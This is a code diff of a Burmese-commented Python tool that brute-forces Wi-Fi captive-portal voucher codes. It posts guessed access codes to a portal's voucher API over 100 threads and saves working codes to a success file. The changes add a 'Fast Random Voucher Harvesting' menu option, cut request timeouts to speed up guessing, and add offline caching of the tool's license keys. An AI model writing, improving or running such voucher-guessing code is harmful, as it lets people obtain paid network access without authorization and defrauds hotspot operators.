@@ -18,7 +18,7 @@ KEYS_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/k
 TRIED_CODES_FILE = "tried_codes.txt"
 SUCCESS_CODES_FILE = "success.txt"
 CODE_TO_TEST = "536884" 
-VOUCHER_THREADS = 100 
+VOUCHER_THREADS = 100 # --- မြန်နှုန်းမြှင့်ရန် Thread တိုးခြင်း ---
 
 # --- CLEAR SCREEN FUNCTION ---
 def clear_screen():
@@ -46,13 +46,22 @@ def check_license():
     print("       🔑 TOKEN ACCESS SYSTEM         ")
     print("========================================\n")
     
+    # --- INTERNET မရှိရင်လည်း Token တောင်းရန် ---
     try:
         url_with_cache_buster = f"{KEYS_URL}?t={int(time.time())}"
-        response = requests.get(url_with_cache_buster, timeout=10)
+        response = requests.get(url_with_cache_buster, timeout=5)
         lines = response.text.splitlines()
-    except Exception as e:
-        print(f"❌ Connection Error: {e}")
-        return False
+        # အင်တာနက်ရရင် အသစ်ရအောင်လုပ်မယ်
+        with open("keys_local.txt", "w") as f:
+            f.write(response.text)
+    except:
+        # အင်တာနက်မရရင် Local ကာကွယ်ထားတာကိုသုံးမယ်
+        if os.path.exists("keys_local.txt"):
+            with open("keys_local.txt", "r") as f:
+                lines = f.readlines()
+        else:
+            print("❌ အင်တာနက်မရှိပါ၊ Local Keys လည်းမရှိပါ။")
+            return False
         
     user_token = input("👉 သင့် Token ကိုရိုက်ထည့်ပါ: ")
     
@@ -94,10 +103,11 @@ def show_menu():
     print("         🛠️  MAIN MENU                ")
     print("========================================")
     print("1. 🌐 Internet Access")
-    print(f"2. 🔍 Test Specific Code: {CODE_TO_TEST}")
-    print("3. 📋 View Success Codes")
+    print(f"2. 🔍 Fast Random Voucher Harvesting")
+    print(f"3. 🔍 Test Specific Code: {CODE_TO_TEST}")
+    print("4. 📋 View Success Codes")
     print("========================================\n")
-    choice = input("👉 ရွေးချယ်ပါ (1-3): ")
+    choice = input("👉 ရွေးချယ်ပါ (1-4): ")
     return choice
 
 # --- PORTAL AUTO DETECT ---
@@ -120,12 +130,11 @@ def test_code(code, portal_host, sid, session):
     voucher_api = f"{portal_host}/api/auth/voucher/"
     try:
         # --- API CALL စမ်းသပ်သည့်နေရာ ---
-        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
         
         if v_res.status_code == 200 and "success" in v_res.text.lower():
             # SUCCESS အစိမ်းရောင်တန်းကျလာမည်
             print(f"\n\033[92m✅ SUCCESS! Found Code: {code}\033[0m")
-            save_tried_code(code)
             save_success_code(code)
             return True
     except:
@@ -213,8 +222,10 @@ if __name__ == "__main__":
         if choice == '1':
             print("\n🌐 Internet Access... (Logic implementation needed)")
         elif choice == '2':
-            test_specific_code()
+            start_voucher_harvesting()
         elif choice == '3':
+            test_specific_code()
+        elif choice == '4':
             print("\n📋 Success Code များ:")
             if os.path.exists(SUCCESS_CODES_FILE):
                 with open(SUCCESS_CODES_FILE, "r") as f:
